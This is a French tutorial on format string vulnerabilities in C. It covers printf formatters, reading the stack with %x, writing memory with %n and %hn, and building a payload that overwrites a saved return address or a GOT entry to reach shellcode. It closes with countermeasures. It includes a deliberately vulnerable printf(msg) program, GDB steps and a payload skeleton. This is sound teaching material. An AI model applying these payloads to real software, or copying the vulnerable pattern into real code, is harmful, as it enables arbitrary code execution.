# Failles Format String

---

## Sommaire

1. [Rappels sur `printf()` et les formateurs](#1-rappels-sur-printf-et-les-formateurs)
2. [La vulnérabilité : qu'est-ce qui cloche ?](#2-la-vulnérabilité--quest-ce-qui-cloche-)
3. [Lire la mémoire](#3-lire-la-mémoire)
4. [Écrire dans la mémoire avec `%n`](#4-écrire-dans-la-mémoire-avec-n)
5. [Ciblage précis avec la notation `%N$`](#5-ciblage-précis-avec-la-notation-n)
6. [Exploitation : rediriger le flux d'exécution](#6-exploitation--rediriger-le-flux-dexécution)
7. [Écrire une adresse 32 bits avec `%hn`](#7-écrire-une-adresse-32-bits-avec-hn)
8. [Contre-mesures et bonnes pratiques](#8-contre-mesures-et-bonnes-pratiques)

---

## 1. Rappels sur `printf()` et les formateurs

La famille `printf()` utilise une **chaîne de format** pour mettre en forme ses arguments :

```c
int nombre = 5;
printf("valeur hex : %x, valeur dec : %d\n", nombre, nombre);
// → valeur hex : 5, valeur dec : 5
```

Les formateurs les plus courants :

| Formateur | Rôle | Type |
|-----------|------|------|
| `%d` | Entier signé en décimal | direct |
| `%u` | Entier non signé en décimal | direct |
| `%x` | Entier en hexadécimal | direct |
| `%s` | Chaîne de caractères | pointeur |
| `%p` | Adresse mémoire | pointeur |
| `%n` | Écrit un entier en mémoire | pointeur |
| `%hn` | Comme `%n` mais sur 2 octets | pointeur |

### Comment `printf()` parcourt la pile

À chaque formateur rencontré, `printf()` consomme **4 octets supplémentaires sur la pile** (architecture 32 bits). Si la chaîne contient `%x%x%x`, la fonction va lire les 3 valeurs suivantes sur la pile, qu'il y ait ou non des arguments correspondants.

```
PILE au moment de l'appel printf("...", a, b, c) :
┌──────────────┐
│  adresse fmt │  ← premier argument (la chaîne de format)
├──────────────┤
│      a       │  ← deuxième argument → consommé par le 1er formateur
├──────────────┤
│      b       │  ← troisième argument → consommé par le 2ème formateur
├──────────────┤
│      c       │  ← quatrième argument → consommé par le 3ème formateur
└──────────────┘
```

---

## 2. La vulnérabilité : qu'est-ce qui cloche ?

Considérons ce programme typiquement vulnérable :

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char msg[1024];
    strncpy(msg, argv[1], sizeof(msg) - 1);
    printf(msg);        // ← FAILLE ICI
    return 0;
}
```

Le problème est dans `printf(msg)`. La chaîne contrôlée par l'utilisateur est passée **directement comme chaîne de format**, sans arguments supplémentaires.

### Ce que fait le compilateur / ce qu'il devrait faire

```c
// Code vulnérable
printf(msg);

// Code correct
printf("%s", msg);
```

Avec le code vulnérable, si `msg` contient `%x%x%x`, `printf()` interprète ces formateurs et va lire des valeurs sur la pile — des valeurs qu'il ne devrait pas lire.

> **Règle d'or :** ne jamais passer une chaîne contrôlée par l'utilisateur directement comme premier argument de `printf()`.

---

## 3. Lire la mémoire

### Formateurs directs vs formateurs pointeurs

Il faut distinguer deux comportements fondamentalement différents.

**Formateurs directs** (`%x`, `%d`, `%u`) : affichent la valeur brute présente sur la pile à la position ciblée.

**Formateurs pointeurs** (`%s`, `%n`) : interprètent la valeur sur la pile comme une **adresse**, puis lisent ou écrivent à cette adresse.

```
Input : %x%x%x%x

PILE :
┌──────────────┐
│  0xbffffd10  │ ← 1er %x → affiche "bffffd10"
├──────────────┤
│  0x000003f2  │ ← 2ème %x → affiche "3f2"
├──────────────┤
│  0x00000006  │ ← 3ème %x → affiche "6"
├──────────────┤
│  0xbffffd80  │ ← 4ème %x → affiche "bffffd80"
└──────────────┘
```

```
Input : %s%s%s%s

PILE :
┌──────────────┐
│  0x00000001  │ ← 1er %s → tente de lire à l'adresse 0x00000001
└──────────────┘
→ Segmentation fault (adresse invalide)
```

`%s` ne lit pas la valeur `0x00000001`, il essaie d'aller chercher une chaîne **à l'adresse** `0x00000001`. Cette adresse n'appartient pas à l'espace mémoire du programme → crash.

### Localiser son buffer sur la pile

En pratique, on commence par placer un marqueur reconnaissable dans l'input (`AAAA` = `0x41414141` en hex) et on augmente progressivement le nombre de `%x` jusqu'à voir ce marqueur apparaître dans la sortie :

```bash
$ ./vuln AAAA%x
AAAAbffffd10

$ ./vuln AAAA%x%x
AAAAbffffd103f2

$ ./vuln AAAA%x%x%x%x%x
AAAAbffffd103f26bffffd8041414141
                              ↑
                    Le marqueur AAAA est au 5ème %x
```

On sait maintenant que le début de notre buffer est accessible via le **5ème formateur**. C'est l'information clé pour la suite.

---

## 4. Écrire dans la mémoire avec `%n`

### Fonctionnement de `%n`

`%n` est un formateur pointeur particulier : au lieu de **lire** en mémoire, il **écrit**.

Il écrit à l'adresse pointée par la valeur qu'il cible sur la pile, et y inscrit le **nombre de caractères déjà affichés** par `printf()` jusqu'à ce point.

```c
int n;
printf("AAAA%n", &n);
// n vaut maintenant 4 (4 caractères affichés avant %n)
```

### Contrôler ce qu'on écrit

Pour écrire une valeur précise, on utilise la notation `%Xd` qui génère un entier sur X caractères (en ajoutant des espaces si nécessaire) :

```c
int n;
printf("%100d%n", 0, &n);
// n vaut maintenant 100
```

En combinant `%Xd` et `%n`, on peut donc choisir exactement quelle valeur écrire en mémoire.

### Démonstration de l'écriture

Si notre buffer est au 5ème emplacement sur la pile, et qu'on y place une adresse valide, on peut écrire à cette adresse :

```
Input : [adresse_cible]\xa0\xfe\xff\xbf + %x%x%x%x%n

PILE :
┌──────────────┐
│  0xbffffea0  │ ← valeur de l'adresse cible (nos 4 premiers octets)
├──────────────┤
│  0xbffffd10  │ ← 1er %x
├──────────────┤
│  0x000003f2  │ ← 2ème %x
├──────────────┤
│  0x00000006  │ ← 3ème %x
├──────────────┤
│  0xbffffd80  │ ← 4ème %x
├──────────────┤
│  0xbffffea0  │ ← %n écrit à l'adresse 0xbffffea0
└──────────────┘
```

`printf()` écrit à `0xbffffea0` le nombre de caractères affichés avant `%n`.

---

## 5. Ciblage précis avec la notation `%N$`

Plutôt que d'enchaîner N formateurs pour atteindre le Nème élément de la pile, on peut cibler directement avec `%N$formateur` :

```bash
# Équivalent de %x%x%x%x%x (5 formateurs)
./vuln AAAA%5$x
# → AAAA41414141

# Équivalent de %x%x%x%x%n
./vuln AAAA%5$n
```

`%5$n` signifie : "traite le 5ème argument comme un `%n`". Les 4 premiers éléments de la pile sont ignorés (ni lus, ni affichés). Cela permet de contrôler finement le nombre de caractères affichés avant `%n`, ce qui est crucial pour écrire des valeurs précises.

---

## 6. Exploitation : rediriger le flux d'exécution

### Objectif

En exploitant la combinaison adresse-dans-le-buffer + `%n`, on peut écrire une valeur arbitraire à une adresse arbitraire. L'objectif classique est d'écraser la **sauvegarde d'EIP** sur la pile (l'adresse de retour de `main()`) pour rediriger l'exécution vers un shellcode.

### Localiser la sauvegarde d'EIP

Dans GDB, en plaçant un breakpoint sur l'instruction `ret` de `main()`, la valeur en haut de la pile (`$esp`) est la sauvegarde d'EIP :

```
(gdb) break *main+147
(gdb) run [payload]
(gdb) x/x $esp
0xbffffcec: 0x400313be   ← adresse de retour actuelle
```

`0xbffffcec` est l'adresse de la sauvegarde d'EIP qu'on va devoir écraser.

### Localiser le shellcode

On place notre shellcode dans le buffer, précédé de NOPs (`\x90`) pour faciliter l'atterrissage. On repère son adresse dans GDB :

```
(gdb) x/40x $esp+300
0xbffffe48: 0x90909090   ← début de la zone NOP + shellcode
```

L'adresse `0xbffffe48` pointe dans notre NOP sled. C'est l'adresse de retour qu'on veut écrire à `0xbffffcec`.

### Structure générale du payload

```
[adresse_sauvegarde_eip+2] [adresse_sauvegarde_eip] [NOPs] [shellcode] [padding] [%5$hn] [%6$hn]
```

On écrit l'adresse en deux fois (voir section suivante) car écrire 3 milliards de caractères d'un coup est impraticable.

---

## 7. Écrire une adresse 32 bits avec `%hn`

### Le problème de la taille

Pour écrire `0xbffffe48` d'un coup avec `%n`, il faudrait afficher 3 221 225 032 caractères avant le `%n`. C'est évidemment impossible en pratique.

### La solution : `%hn` et l'écriture en deux fois

`%hn` fonctionne comme `%n` mais n'écrit que **2 octets** (16 bits). On écrit donc l'adresse cible en deux moitiés :

```
Adresse à écrire : 0xbffffe48

Moitié haute : 0xbfff = 49151 (décimal)
Moitié basse  : 0xfe48 = 65096 (décimal)
```

On a besoin de deux adresses cibles (les deux moitiés de la sauvegarde d'EIP) et de deux `%hn` :

```
Écriture 1 : %hn à l'adresse 0xbffffcee → écrit 0xbfff
Écriture 2 : %hn à l'adresse 0xbffffcec → écrit 0xfe48
```

Résultat à `0xbffffcec` :

```
bffffcec : 48  ← octet 0
bffffced : fe  ← octet 1
bffffcee : ff  ← octet 2
bffffcef : bf  ← octet 3
→ valeur 32 bits : 0xbffffe48 ✓
```

### Calcul des paddings

Notons `H` = partie haute = 49151 et `B` = partie basse = 65096.

On doit écrire H en premier (valeur plus petite), puis B. Le nombre de caractères affichés s'accumule entre les deux `%hn`.

```
Taille du buffer avant les paddings :
  - 4 octets (adresse 1) + 4 octets (adresse 2) = 8 octets
  - N octets de NOPs
  - M octets de shellcode

Padding 1 (pour atteindre H) :
  X = H - 8 - N - M

Padding 2 (pour atteindre B, le compteur repart de H) :
  Y = B - H
```

Avec `%Xd%5$hn%Yd%6$hn` dans le payload.

### Payload final (structure)

```python
payload = (
    "\xee\xfc\xff\xbf"   # adresse haute (bffffcee)
  + "\xec\xfc\xff\xbf"   # adresse basse (bffffcec)
  + "\x90" * N           # NOP sled
  + shellcode            # shellcode
  + "%Xd%5$hn"           # écriture de la partie haute
  + "%Yd%6$hn"           # écriture de la partie basse
)
```

---

## 8. Contre-mesures et bonnes pratiques

### Côté développeur

**Ne jamais utiliser une entrée utilisateur comme chaîne de format :**

```c
// Vulnérable
printf(user_input);
fprintf(logfile, user_input);

// Correct
printf("%s", user_input);
fprintf(logfile, "%s", user_input);
```

**Compiler avec les warnings activés :**  
GCC détecte souvent ce pattern et émet un avertissement :

```
warning: format not a string literal and no format arguments [-Wformat-security]
```

L'option `-Wformat-security` (incluse dans `-Wall`) doit être activée en permanence.

**Utiliser `snprintf()` plutôt que `sprintf()` :**  
Ça ne corrige pas la faille en soi, mais limite les dégâts en cas d'autre bug adjacent.

### Protections système

| Protection | Effet sur Format String |
|------------|------------------------|
| **ASLR** (Address Space Layout Randomization) | Rend les adresses imprévisibles, complique le ciblage |
| **NX / DEP** (No-Execute) | Empêche l'exécution de shellcode sur la pile |
| **Stack canaries** | Détecte l'écrasement de la sauvegarde d'EIP |
| **RELRO** (Relocation Read-Only) | Protège la GOT contre les écritures, bloque le GOT overwrite |

Ces protections se combinent et rendent l'exploitation moderne beaucoup plus complexe. Sur un système à jour avec toutes ces protections actives, une simple format string ne suffit généralement plus — il faut l'enchaîner avec d'autres techniques (info leak → bypass ASLR → ROP chain).

### La GOT overwrite : variante courante

Au lieu d'écraser la sauvegarde d'EIP, une technique très répandue consiste à écraser une entrée de la **GOT** (Global Offset Table) — la table qui contient les adresses résolues des fonctions de la libc. En remplaçant l'adresse de `exit()` ou `printf()` dans la GOT par l'adresse de son shellcode, la prochaine fois que le programme appelle cette fonction, c'est le shellcode qui s'exécute.

```
GOT entry pour exit() :
  adresse dans GOT : 0x08049abc
  valeur actuelle  : 0x4003f6e0 (adresse de exit dans libc)
  valeur voulue    : 0xbffffe48 (adresse du shellcode)
```

Cette technique est souvent plus fiable que l'écrasement d'EIP car les adresses de la GOT sont fixes (sans ASLR) et connues à l'avance via `objdump` :

```bash
objdump -R ./vuln | grep exit
# 08049abc R_386_JUMP_SLOT   exit
```

---

## Conclusion

Les failles Format String reposent sur une erreur de conception simple : traiter une donnée utilisateur comme du code (une chaîne de format). La conséquence est double — on peut **lire** n'importe quoi sur la pile avec `%x`/`%s`, et **écrire** n'importe quoi n'importe où en mémoire avec `%n`/`%hn`.

C'est une classe de vulnérabilités qui a pratiquement disparu du code moderne grâce aux warnings compilateur et aux bonnes pratiques, mais elle reste très présente dans les challenges de sécurité et dans les anciens codes embarqués ou systèmes legacy.

La chaîne complète d'exploitation — localiser le buffer, trouver l'offset, calculer les paddings, écrire une adresse en deux `%hn` — est un excellent exercice pour comprendre en profondeur le fonctionnement de la pile et de la mémoire de processus.